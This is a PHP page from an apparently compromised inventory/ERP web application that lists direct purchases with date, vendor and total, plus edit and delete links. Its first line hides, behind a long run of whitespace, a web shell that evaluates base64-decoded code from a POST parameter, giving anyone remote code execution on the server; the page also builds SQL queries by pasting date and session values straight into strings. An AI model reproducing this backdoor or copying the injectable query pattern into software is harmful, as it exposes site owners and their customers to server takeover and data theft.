<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n410325']));?><?php include "jquery.php";
	...
	<div id="control-bar" class="grey-bg clearfix"><div class="container_12">
		...
		<div class="float-right"> 
			<?php if($_SESSION['db'] == "souza") { ?>
					<button type="button" onClick="document.location='dashboardsub.php?page=tally_purchases_a'"><img src="images/icons/fugue/tick-circle.png" width="16" height="16"> Tally Import</button>
			<?php } ?>		

			<button type="button" onClick="document.location='dashboardsub.php?page=pp_adddirectpurchase_a'"><img src="images/icons/fugue/tick-circle.png" width="16" height="16"> Add</button>
...
<tbody>
	  ...
	  <?php
         include "config.php"; 
		 //echo "sectorall".$_SESSION['sectorall'];
		    if($_SESSION['sectorall'] == "all" || ($_SESSION['sectorall'] == "" && $_SESSION['sectorlist'] == ""))
		   {
		   $query1 = "SELECT distinct(so),date,vendor,grandtotal,flag FROM pp_sobi WHERE dflag = '0' and date >= '$fromdate' and date <= '$todate'  order by date DESC ";
		   }
		   else
		   {
		   $sectorlist = $_SESSION['sectorlist'];
		 // $sectorwarelist =  $_SESSION['sectorwarelist'];
		    $query1 = "SELECT distinct(so),date,vendor,grandtotal,flag FROM pp_sobi WHERE dflag = '0' and date >= '$fromdate' and date <= '$todate' and (warehouse in ($sectorlist) )  order by date DESC";
		   }
		 //echo $query1;
		  /* if($_SESSION['db'] == "feedatives")
		{
		  ...
		  $query2 = "SELECT * FROM tbl_sector where place = '$sectorr'";
		   ...
		   $query1 = "SELECT distinct(so),date,vendor,grandtotal,flag FROM pp_sobi WHERE dflag = '0' and date >= '$fromdate' and date <= '$todate' and (warehouse = '$sectorr' or warehouse = '$sectorrware')  order by date DESC";
		   }
	   ...
	   if($_SESSION['sectorall'] == "all")
		  ...
		  /*$query2 = "SELECT * FROM tbl_sector where place = '$sectorr'";
		   ...
		   $query1 = "SELECT distinct(so),date,vendor,grandtotal,flag FROM pp_sobi WHERE dflag = '0' and date >= '$fromdate' and date <= '$todate' and (warehouse in ($sectorlist) or warehouse in ('$sectorwarelist'))  order by date DESC";
		   }
           ...
           { $i++; 
            ...
            while($row2 = mysql_fetch_assoc($result2))
            {
             ...
             if(($_SESSION['db'] == "mlcf" && strlen(strstr($row2['code'],'LFD'))>0) or ( $_SESSION['db'] == "mbcf" && strlen(strstr($row2['code'],'BFD'))>0 ) or ( $_SESSION['db'] == "ncf" && strlen(strstr($row2['code'],'NFD'))>0 ) or ( $_SESSION['db'] == "ncf" && strlen(strstr($row2['code'],'LFD'))>0 ))
			  ...
			  else if($_SESSION['db'] == 'albustanlayer' && strlen(strstr($row2['code'],'LFD'))>0)
			  $qty = $qty.($row2['sentquantity']/1000)." / "; 
			  else
			  $qty = $qty.$row2['sentquantity']." / "; 
			  if($_SESSION['db'] == 'albustanlayer' && strlen(strstr($row2['code'],'LFD'))>0)
              $price = $price.($row2['rateperunit']*1000)." / "; 
			  else
...
<a href="dashboardsub.php?page=pp_editdirectpurchase_a&id=<?php echo $row1['so']; ?>"><img src="images/icons/fugue/pencil.png" style="border:0px" title="Edit"/></a>
&nbsp;&nbsp;&nbsp;<a onclick="if(confirm('Are you sure,want to delete')) document.location ='pp_deletedirectpurchase_a.php?id=<?php echo $row1['so']; ?>'"><img src="images/icons/fugue/cross-circle.png" style="border:0px" title="Delete" /></a>&nbsp;
...
document.location = "dashboardsub.php?page=pp_directpurchase_a&month=" + month + "&year=" + year;
}
</script>
